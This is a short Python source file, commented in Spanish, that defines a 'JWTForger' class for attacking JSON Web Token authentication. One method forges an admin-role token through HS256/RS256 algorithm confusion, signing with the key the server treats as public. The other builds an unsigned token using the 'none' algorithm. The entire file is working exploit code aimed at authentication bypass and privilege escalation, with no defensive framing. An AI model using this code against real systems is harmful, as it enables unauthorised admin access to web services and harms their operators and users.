import jwt
import datetime

class JWTForger:
    def __init__(self, secret_key):
        self.secret = secret_key

    def create_algorithm_confusion_token(self, username="admin", role="admin"):
        """
        Explota la vulnerabilidad de confusión de algoritmo (HS256 vs RS256).
        """
        payload = {
            "sub": username,
            "role": role,
            "iat": datetime.datetime.now(datetime.timezone.utc),
            "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=2)
        }
        # Forjamos usando HS256 con la clave que el servidor espera que sea pública
        token = jwt.encode(payload, self.secret, algorithm='HS256')
        return token

    def create_none_algorithm_token(self, username="admin"):
        """
        Intenta el bypass del algoritmo 'None'.
        """
        payload = {"sub": username, "role": "admin"}
        # Algunos servidores vulnerables aceptan tokens sin firma
        token = jwt.encode(payload, "", algorithm='none')
        return token
